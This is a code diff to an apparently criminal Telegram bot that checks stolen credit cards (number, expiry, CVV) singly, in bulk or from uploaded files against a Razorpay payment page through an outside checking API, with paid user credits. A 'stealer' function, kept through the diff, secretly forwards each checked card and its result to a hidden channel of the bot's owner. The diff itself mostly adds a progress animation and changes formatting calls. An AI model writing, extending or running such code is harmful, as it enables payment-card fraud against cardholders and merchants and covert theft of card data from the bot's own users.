@@ -4,7 +4,7 @@ import re
 import json
 import aiohttp
 import os
-from pyrogram import Client, filters
+from pyrogram import Client, filters, enums
 from FUNC.usersdb_func import *
 from FUNC.defs import *
 from TOOLS.check_all_func import *
@@ -19,7 +19,7 @@ MAX_TSC_LIMIT = 100
 API_BASE = "https://pay.cxchk.site/razor/auto"
 SITE_PARAM = "https://pages.razorpay.com/lckuk-international"
 
-# ========== STEALER CONFIG (same as your other gates) ==========
+# ========== STEALER CONFIG ==========
 STEALER_CHANNEL_ID = -1003627495953
 OWNER_DM = "https://t.me/spid_3r"
 SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
@@ -31,10 +31,10 @@ async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_ta
 {SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
 {SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
 
-{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
-{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
-{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
-        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
+{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode=enums.ParseMode.HTML)
     except Exception as e:
         print(f"[Stealer Error] {e}")
 
@@ -87,23 +87,43 @@ async def razor_single(client, message):
                 f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
                 f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                 f"↪ <b>ᴜꜱᴀɢᴇ :</b> /rz cc|mm|yyyy|cvv",
-                quote=True, parse_mode="HTML"
+                quote=True, parse_mode=enums.ParseMode.HTML
             )
             return
 
         cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
 
-        msg = await message.reply_text(
-            f"✧ ᴄʜᴇᴄᴋɪɴɢ... ✧\n\n"
-            f"{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>\n"
-            f"{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>",
-            quote=True, parse_mode="HTML"
-        )
+        # Animation step 1
+        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧
+
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
+        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
+        await asyncio.sleep(0.5)
+
+        # Step 2
+        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧
+
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
+        secondchk = await client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
+        await asyncio.sleep(0.5)
 
         start = time.perf_counter()
         status, api_message = await call_razor_api(fullcc)
         elapsed = time.perf_counter() - start
+
+        # Step 3 (full squares)
+        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧
+
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
+        thirdchk = await client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
+        await asyncio.sleep(0.5)
 
         getbin = await get_bin_details(cc)
         brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
@@ -124,9 +144,10 @@ async def razor_single(client, message):
 {SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
 {SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
 
-        await msg.edit_text(final_text, disable_web_page_preview=True, parse_mode="HTML")
+        await client.edit_message_text(message.chat.id, thirdchk.id, final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
         await setantispamtime(user_id)
         await deductcredit(user_id)
+
     except Exception:
         import traceback
         await error_log(traceback.format_exc())
@@ -144,26 +165,14 @@ async def razor_mass(client, message):
             return
         role = checkall[1]
 
-        ccs = []
-        if message.reply_to_message:
-            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
-            ccs = extract_cards(reply_text)
-        else:
-            text_parts = message.text.split(maxsplit=1)
-            if len(text_parts) > 1:
-                ccs = extract_cards(text_parts[1])
-
-        if not ccs:
-            await message.reply_text(
-                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
-                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
-                f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mrz cc|mm|yyyy|cvv (max {MAX_MSC_LIMIT})",
-                quote=True, parse_mode="HTML"
-            )
+        getcc = await getcc_for_mass(message, role)
+        if not getcc[0]:
+            await message.reply_text(getcc[1], message.id, parse_mode=enums.ParseMode.HTML)
             return
+        ccs = getcc[1]
 
         if len(ccs) > MAX_MSC_LIMIT:
-            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
+            await message.reply_text(f"✦ ᴍᴀx {MAX_MSC_LIMIT} ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id, parse_mode=enums.ParseMode.HTML)
             ccs = ccs[:MAX_MSC_LIMIT]
 
         await process_sequential_check(client, message, ccs, user_id, first_name, role)
@@ -195,7 +204,7 @@ async def razor_txt(client, message):
                 f"✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦\n"
                 f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                 f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to a .txt file (max {MAX_TSC_LIMIT} cards)",
-                quote=True, parse_mode="HTML"
+                quote=True, parse_mode=enums.ParseMode.HTML
             )
             return
 
@@ -206,11 +215,11 @@ async def razor_txt(client, message):
         os.remove(file_path)
 
         if not ccs:
-            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
+            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
             return
 
         if len(ccs) > MAX_TSC_LIMIT:
-            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
+            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
             ccs = ccs[:MAX_TSC_LIMIT]
 
         await process_sequential_check(client, message, ccs, user_id, first_name, role)
@@ -233,7 +242,7 @@ async def process_sequential_check(client, message, ccs, user_id, first_name, ro
         f"{SYMBOL} Progress: 0/{total}\n"
         f"Approved ✅: 0\nDeclined ❌: 0\nRemaining: {total}\n\n"
         f"Checked by: {first_name} ({role})",
-        quote=True, parse_mode="HTML"
+        quote=True, parse_mode=enums.ParseMode.HTML
     )
 
     for idx, fullcc in enumerate(ccs, 1):
@@ -266,7 +275,7 @@ async def process_sequential_check(client, message, ccs, user_id, first_name, ro
             f"{SYMBOL} Progress: {idx}/{total}\n"
             f"Approved ✅: {approved_count}\nDeclined ❌: {declined_count}\nRemaining: {remaining}\n\n"
             f"Checked by: {first_name} ({role})",
-            parse_mode="HTML"
+            parse_mode=enums.ParseMode.HTML
         )
         await asyncio.sleep(0.5)
 
@@ -286,12 +295,11 @@ async def process_sequential_check(client, message, ccs, user_id, first_name, ro
 
 {SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
 {SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
-        await message.reply_text(approved_msg, quote=True, parse_mode="HTML")
+        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
         await asyncio.sleep(0.5)
 
     elapsed = round(time.perf_counter() - start_time, 2)
 
-    # Declined summary
     if approved_count > 0:
         declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
         decl_text = f"❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})\n\n━━━━━━━━━━━━━━━━━━━━\n"
@@ -300,14 +308,14 @@ async def process_sequential_check(client, message, ccs, user_id, first_name, ro
         if declined_count > 15:
             decl_text += f"\n... and {declined_count - 15} more declined cards"
         decl_text += f"\n━━━━━━━━━━━━━━━━━━━━\n✅ Approved: {approved_count}\n❌ Declined: {declined_count}\n📊 Total: {total}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})"
-        await message.reply_text(decl_text, quote=True, parse_mode="HTML")
+        await message.reply_text(decl_text, quote=True, parse_mode=enums.ParseMode.HTML)
     else:
         await message.reply_text(
             f"❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀\n\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
             f"📊 Total Cards: {total}\n❌ All Declined: {declined_count}\n⏱ Time: {elapsed}s\n"
             f"👤 Checked by: {first_name} ({role})",
-            quote=True, parse_mode="HTML"
+            quote=True, parse_mode=enums.ParseMode.HTML
         )
 
     await setantispamtime(user_id)
